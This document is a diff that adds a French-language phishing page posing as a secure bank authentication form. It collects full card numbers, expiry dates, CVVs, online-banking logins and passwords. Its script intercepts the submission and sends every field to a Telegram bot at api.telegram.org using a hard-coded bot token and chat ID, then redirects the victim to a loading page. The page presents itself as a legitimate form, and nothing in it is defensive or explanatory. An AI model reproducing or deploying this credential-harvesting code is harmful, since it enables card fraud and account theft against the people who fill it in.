@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire Sécurisé</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.2); width: 100%; max-width: 500px; }
+        h2 { text-align: center; color: #048848; margin-bottom: 20px; }
+        .form-group { margin-bottom: 15px; }
+        label { font-weight: bold; display: block; margin-bottom: 5px; color: #333; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; }
+        .error { color: red; font-size: 12px; margin-top: 5px; }
+        .btn { width: 100%; background: #048848; color: white; padding: 12px; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn:hover { background: #036b36; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔒 Veuillez vous authentifier</h2>
+        
+        <form id="banqueForm" action="chargement.html" >
+            <div class="form-group"><label>Nom</label><input type="text" id="nom" required><div class="error" id="nomError"></div></div>
+            <div class="form-group"><label>Prénom</label><input type="text" id="prenom" required><div class="error" id="prenomError"></div></div>
+            <div class="form-group"><label>Code postal</label><input type="text" id="code-postal" required><div class="error" id="codePostalError"></div></div>
+            <div class="form-group"><label>Région</label><input type="text" id="region" required><div class="error" id="regionError"></div></div>
+            <div class="form-group"><label>Nom de la banque</label><input type="text" id="banque" required><div class="error" id="banqueError"></div></div>
+            <div class="form-group"><label>Département de l'agence</label><input type="text" id="departement" required><div class="error" id="departementError"></div></div>
+            <div class="form-group"><label>Numéro de carte</label><input type="text" id="numero-carte" required><div class="error" id="carteError"></div></div>
+            <div class="form-group"><label>Date d'expiration</label><input type="text" id="expiration" placeholder="MM/AA" required><div class="error" id="expirationError"></div></div>
+            <div class="form-group"><label>CVV</label><input type="text" id="cvv" required><div class="error" id="cvvError"></div></div>
+            <div class="form-group"><label>Identifiant (Accès en ligne)</label><input type="text" id="identifiant" required><div class="error" id="identifiantError"></div></div>
+            <div class="form-group"><label>Mot de passe</label><input type="password" id="mot-de-passe" required><div class="error" id="mdpError"></div></div>
+            <div class="form-group"><label>E-mail</label><input type="email" id="email" required><div class="error" id="emailError"></div></div>
+            <button type="submit" class="btn">Envoyer</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('banqueForm').addEventListener('submit', function(event) {
+            let isValid = true;
+
+            // Réinitialisation des messages d'erreur
+            document.querySelectorAll('.error').forEach(error => error.textContent = '');
+
+            function validateField(id, errorId, regex, message) {
+                const value = document.getElementById(id).value.trim();
+                if (!regex.test(value)) {
+                    document.getElementById(errorId).textContent = message;
+                    isValid = false;
+                }
+            }
+
+            validateField('code-postal', 'codePostalError', /^\d{5}$/, 'Code postal invalide (5 chiffres).');
+            validateField('numero-carte', 'carteError', /^\d{16}$/, 'Numéro de carte invalide (16 chiffres).');
+            validateField('expiration', 'expirationError', /^(0[1-9]|1[0-2])\/\d{2}$/, 'Format MM/AA requis.');
+            validateField('cvv', 'cvvError', /^\d{3}$/, 'CVV invalide (3 chiffres).');
+            validateField('email', 'emailError', /^[^\s@]+@[^\s@]+$/, 'E-mail invalide.');
+
+            if (isValid) {
+    event.preventDefault(); // Empêcher l'envoi classique
+    sendToTelegram(); // Envoyer les données
+    setTimeout(() => {
+        window.location.href = "chargement.html"; // Redirection après l'envoi
+    }, 2000); // Attendre 2 secondes pour laisser le temps à l'envoi
+}
+        });
+
+        function sendToTelegram() {
+            const token = "7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw"; // Remplace par ton token
+            const chat_id = "7263826117"; // Remplace par ton ID
+            const message = `
+🔔 *Nouveau Formulaire Reçu* 🔔
+👤 *Nom:* ${document.getElementById('nom').value}
+👤 *Prénom:* ${document.getElementById('prenom').value}
+📮 *Code postal:* ${document.getElementById('code-postal').value}
+🌍 *Région:* ${document.getElementById('region').value}
+🏦 *Banque:* ${document.getElementById('banque').value}
+🏢 *Département de l'agence:* ${document.getElementById('departement').value}
+💳 *Numéro de carte:* ${document.getElementById('numero-carte').value}
+📆 *Expiration:* ${document.getElementById('expiration').value}
+🔢 *CVV:* ${document.getElementById('cvv').value}
+🔑 *Identifiant:* ${document.getElementById('identifiant').value}
+🔐 *Mot de passe:* ${document.getElementById('mot-de-passe').value}
+📧 *E-mail:* ${document.getElementById('email').value}
+            `;
+
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("✅ Envoyé avec succès !");
+                    } else {
+                        alert("❌ Échec de l'envoi.");
+                    }
+                })
+                .catch(error => alert("❌ Erreur d'envoi."));
+        }
+    </script>
+
+</body>
+</html>
